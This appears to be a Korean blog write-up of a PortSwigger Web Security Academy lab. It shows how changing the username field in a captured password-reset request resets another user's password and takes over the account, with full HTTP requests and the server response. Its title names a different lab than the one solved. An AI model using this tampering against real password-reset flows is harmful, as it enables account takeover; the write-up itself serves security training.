---
layout: post
title: "Burp Academy-인증(Authentication) 취약점: Username enumeration via subtly different responses"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, 인증취약점]
toc: true
---

# 개요
- 인증(Authentication)에 관련된 취약점이다. 
- 취약점 설명 주소: https://portswigger.net/web-security/authentication/other-mechanisms
- 문제 주소: : https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic
- 난이도: APPRENTICE (쉬움)

# 랩설명
패스워드 리셋 기능에 취약점이 있다. 이 것을 이용해서 calors 계정에 로그인한다. 

```
This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

Your credentials: wiener:peter
Victim's username: carlos
```

# 패스워드 재설정 과정 
패스워드 재설정 과정을 살펴본다.   
로그인 화면의 Forgot password? 버튼을 누르면 패스워드를 재설정할 수 있다. 

![패스워드 재설정 링크](/images/burp-academy-authn-3-1.png)

wiener를 입력하면 등록 이메일 주소로 패스워드 변경할 수 있는 링크가 전송된다. 

![패스워드 재설정 링크](/images/burp-academy-authn-3-4.png)

링크를 누르면 해당 유저의 패스워드를 재설정할 수 있다. 

![패스워드 재설정](/images/burp-academy-authn-3-5.png)

이 때의 HTTP요청은 다음과 같다. username 파라메터에 wiener 라는 계정명이 있는 것을 알 수 있다. 

```http
POST /forgot-password?temp-forgot-password-token=jwpDv6zqDBPAdAyR4ZIiT6lh9YPR8ffo HTTP/2
Host: 0a3100a20303d26980695dee00db0032.web-security-academy.net
Cookie: session=qhlQrv3l9EcFoezCcIEiNfgiU3H3j745
Content-Length: 117
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a3100a20303d26980695dee00db0032.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3100a20303d26980695dee00db0032.web-security-academy.net/forgot-password?temp-forgot-password-token=jwpDv6zqDBPAdAyR4ZIiT6lh9YPR8ffo
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

temp-forgot-password-token=jwpDv6zqDBPAdAyR4ZIiT6lh9YPR8ffo&username=wiener&new-password-1=12345&new-password-2=12345
```


# carlos유저의 패스워드 재설정
username을 carlos로 변경하고 요청해보면 302응답이 회신되는 것을 알 수 있다. 패스워드를 재설정이 성공한 것 같다. 

```http
POST /forgot-password?temp-forgot-password-token=jwpDv6zqDBPAdAyR4ZIiT6lh9YPR8ffo HTTP/2
Host: 0a3100a20303d26980695dee00db0032.web-security-academy.net
Cookie: session=qhlQrv3l9EcFoezCcIEiNfgiU3H3j745
Content-Length: 117
Cache-Control: max-age=0
Sec-Ch-Ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: https://0a3100a20303d26980695dee00db0032.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3100a20303d26980695dee00db0032.web-security-academy.net/forgot-password?temp-forgot-password-token=jwpDv6zqDBPAdAyR4ZIiT6lh9YPR8ffo
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,ko;q=0.7

temp-forgot-password-token=jwpDv6zqDBPAdAyR4ZIiT6lh9YPR8ffo&username=carlos&new-password-1=12345&new-password-2=12345
```


```http
HTTP/2 302 Found
Location: /
Set-Cookie: session=KeImI4omqFQeLHsGAyI4BRGmMAXVrDSp; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0


```

변경된 패스워드를 사용해서 carlos유저로 로그인하면 로그인이 되는 것을 알 수 있다. 그리고 문제 풀이에 성공했다는 메세지가 출력된다. 

![성공](/images/burp-academy-authn-3-success.png)